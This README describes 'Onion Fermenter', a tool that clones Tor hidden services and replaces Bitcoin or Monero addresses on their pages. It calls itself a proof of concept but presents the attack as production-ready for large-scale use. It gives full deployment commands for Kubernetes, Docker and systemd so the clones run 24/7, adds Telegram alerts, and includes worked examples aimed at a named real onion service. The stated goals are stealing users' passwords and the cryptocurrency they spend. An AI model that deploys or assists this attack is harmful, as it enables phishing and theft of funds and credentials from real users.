Onion Fermenter (OF)
=====

A proof of concept for Bitcoin stealing man-in-the-middle (MitM) attacks against TOR hidden services on a large scale. Writeup [here](https://shufflingbytes.com/posts/ripping-off-professional-criminals-by-fermenting-onions-phishing-darknet-users-for-bitcoins/).

[![asciicast](https://asciinema.org/a/DQOE7J2ygPQ9tY7rLQSJIlZPs.png)](https://asciinema.org/a/DQOE7J2ygPQ9tY7rLQSJIlZPs)

With OF, you can create any number of clones of web hidden services that function just like the original but with cryptocurrency addresses (Bitcoin or Monero) on pages replaced with your own.
You can monitor any users lured to use these clone pages, steal their passwords, and snatch the cryptocurrency they spend on the sites.

## Documentation

- **[QUICKSTART.md](QUICKSTART.md)** - Get started in 5 minutes
- **[INSTALL.md](INSTALL.md)** - Comprehensive installation guide with all prerequisites
- **[PRODUCTION.md](PRODUCTION.md)** - Production deployment guide with monitoring and scaling
- **[examples/](examples/)** - Configuration examples for BTC and XMR

## New Features

- **Multi-Currency Support**: Now supports both Bitcoin (BTC) and Monero (XMR) address replacement
- **24/7 Operation**: Designed to run continuously without requiring user login
- **Telegram Notifications**: Real-time alerts when addresses are replaced
- **Production Ready**: Complete guides for Docker, Kubernetes, and bare metal deployments

# Usage

OF is implemented as a containerized application that is configured using environment variables and a file mount.
You can run it with Docker, but the full power is unleashed with the scalability and redundancy of Kubernetes.

## Preparations
What you need:
- Cryptocurrency addresses to receive funds (Bitcoin or Monero)
- TOR onion address(es) you want to attack
- (Optional) Telegram bot token and chat ID for notifications

### Bitcoin Addresses
Bitcoin addresses you can get by creating a local wallet using [Electrum](https://electrum.org/#home), and [pre-generating](https://electrum.readthedocs.io/en/latest/faq.html#how-can-i-pre-generate-new-addresses) for example 1000 addresses. 
Put the addresses into a file, one address per line.

### Monero Addresses
For Monero, use the official [Monero wallet](https://www.getmonero.org/downloads/) to generate addresses.
Put the addresses into a file, one address per line.

Note: Replacing addresses must be of same length as the ones that get replaced. This means it may be useful to have addresses of all types and lengths in the file.

### Telegram Setup (Optional)
To receive real-time notifications:
1. Create a Telegram bot using [@BotFather](https://t.me/botfather)
2. Get your bot token
3. Get your chat ID by messaging [@userinfobot](https://t.me/userinfobot)
4. Set `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` environment variables

## Running on Kubernetes
### Prerequisites
- **Kubernetes cluster** (REQUIRED - see INSTALL.md for setup instructions)
  - Local: Minikube or kind
  - Cloud: AWS EKS, Google GKE, or Azure AKS
- kubectl configured and connected to your cluster
- make
- helm

**Important**: Before running `make deploy`, verify your cluster is accessible:
```bash
kubectl cluster-info
kubectl get nodes
```

If you get an error, you need to set up a Kubernetes cluster first. See the [INSTALL.md](INSTALL.md#setting-up-a-kubernetes-cluster) guide for detailed instructions.

### Deploy to Kubernetes

This will create NREPLICAS clones of the victim onion service VICTIM_ONION_ID, and the original cryptocurrency addresses will be replaced by those in ADDRESS_FILE.

```bash
# First, verify cluster access
kubectl cluster-info

# Set environment variables
export NREPLICAS=<number of replicas to create>
export VICTIM_ONION_ID=<victim onion domain without .onion suffix>
export ADDRESS_FILE=<absolute path to a file with your receiving addresses>
export CURRENCY_TYPE=<BTC or XMR, defaults to BTC>
export TELEGRAM_BOT_TOKEN=<your telegram bot token> # Optional
export TELEGRAM_CHAT_ID=<your telegram chat id> # Optional

# Deploy to Kubernetes
make deploy
```

**Troubleshooting**: If you get "Kubernetes cluster unreachable" error:
```bash
# Quick local setup for testing
curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
sudo install minikube-linux-amd64 /usr/local/bin/minikube
minikube start --driver=docker
kubectl cluster-info
```

Note: It takes a while for the services to be available (~60 seconds).

You can change the configuration of an already running deployment by modifying the NREPLICAS and ADDRESS_FILE environment variables to your liking and running `make deploy` again.

### Get the onion addresses of your clones

This will get all the onion addresses of the clones you created of the victim onion service VICTIM_ONION_ID. If VICTIM_ONION_ID is not set, it will get the clone addresses for all victim services.

```
export VICTIM_ONION_ID=<victim onion domain without .onion suffix>
make get-addresses
```

Note: The addresses change if the corresponding pods are restarted. The pods contain liveness checks and will automatically restart containers that remain unavailable for long enough.

### View and manage your clones

The clones will be deployed in the Kubernetes namespace "onionfermenter" using helm. You can interact with them as with any Kubernetes resources. 

```
helm ls -n onionfermenter
kubectl -n onionfermenter get deployments
kubectl -n onionfermenter get pods
```

Delete all related resources
```
kubectl delete namespace onionfermenter
```

### Example

Create 100 clones of Ahmia and replace all addresses with Torproject's donate address, with Telegram notifications

```
git clone https://github.com/ValtteriL/OnionFermenter.git
cd OnionFermenter

cat > bitcoin-addresses.txt << EOF
bc1qtt04zfgjxg7lpqhk9vk8hnmnwf88ucwww5arsd
EOF

export ADDRESS_FILE="`realpath bitcoin-addresses.txt`"
export NREPLICAS=100
export VICTIM_ONION_ID=juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd
export CURRENCY_TYPE=BTC
export TELEGRAM_BOT_TOKEN=your_bot_token_here
export TELEGRAM_CHAT_ID=your_chat_id_here

make deploy
```

## Running on Docker
### Prerequisites
- make
- docker

### Deploy

This will create a single clone of the victim onion service VICTIM_ONION_ID, and the original cryptocurrency addresses will be replaced by those in ADDRESS_FILE.

```
export VICTIM_ONION_ID=<victim onion domain without .onion suffix>
export ADDRESS_FILE=<absolute path to a file with your receiving addresses>
export CURRENCY_TYPE=<BTC or XMR, defaults to BTC>
export TELEGRAM_BOT_TOKEN=<your telegram bot token> # Optional
export TELEGRAM_CHAT_ID=<your telegram chat id> # Optional
make run # sudo -E make run
```

The container runs with `--restart unless-stopped` policy, ensuring 24/7 operation even after system reboots.

Note: It takes a while for the services to be available (~60-300 seconds).

### Get the onion addresses of your clones

This will get all the onion addresses of the clones you created of the victim onion service VICTIM_ONION_ID.

```
export VICTIM_ONION_ID=<victim onion domain without .onion suffix>
make get-addresses-docker # sudo -E make get-addresses-docker
```

### View and manage your clones

The clones will have the VICTIM_ONION_ID as the prefix of their names. You can use the usual docker commands to manage them. 

```
docker ps
```

Delete clone
```
docker rm --force <container id or VICTIM_ONION_ID>
```

## Running as a Systemd Service (24/7 Operation on VPS)

For non-containerized deployments on Linux systems, you can use systemd to ensure OnionFermenter runs 24/7 without requiring user login.

### Setup

1. Copy the systemd service file:
```bash
sudo cp deploy/onionfermenter.service /etc/systemd/system/
```

2. Edit the service file to configure your settings:
```bash
sudo nano /etc/systemd/system/onionfermenter.service
```

Update the environment variables:
- `VICTIM_ONION_ID`: Your target onion ID
- `CURRENCY_TYPE`: BTC or XMR
- `TELEGRAM_BOT_TOKEN`: Your Telegram bot token (optional)
- `TELEGRAM_CHAT_ID`: Your Telegram chat ID (optional)

3. Enable and start the service:
```bash
sudo systemctl daemon-reload
sudo systemctl enable onionfermenter
sudo systemctl start onionfermenter
```

4. Check status:
```bash
sudo systemctl status onionfermenter
sudo journalctl -u onionfermenter -f
```

The service will automatically restart if it crashes and will start automatically on system boot.

### Example 1: Bitcoin with Telegram Notifications

Create a single clone of Ahmia and replace all addresses with Torproject's donate address, with Telegram notifications

```
git clone https://github.com/ValtteriL/OnionFermenter.git
cd OnionFermenter

cat > bitcoin-addresses.txt << EOF
bc1qtt04zfgjxg7lpqhk9vk8hnmnwf88ucwww5arsd
EOF

export ADDRESS_FILE="`realpath bitcoin-addresses.txt`"
export VICTIM_ONION_ID=juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd
export CURRENCY_TYPE=BTC
export TELEGRAM_BOT_TOKEN=your_bot_token_here
export TELEGRAM_CHAT_ID=your_chat_id_here

make run # sudo -E make run
```

### Example 2: Monero without Telegram

Create a clone targeting a Monero marketplace

```
git clone https://github.com/ValtteriL/OnionFermenter.git
cd OnionFermenter

cat > monero-addresses.txt << EOF
48YourMoneroAddressHere95Characters
EOF

export ADDRESS_FILE="`realpath monero-addresses.txt`"
export VICTIM_ONION_ID=your_victim_onion_id_here
export CURRENCY_TYPE=XMR

make run # sudo -E make run
```

# Development

Notes to self

## Build + push container:
```
make build
make push
```
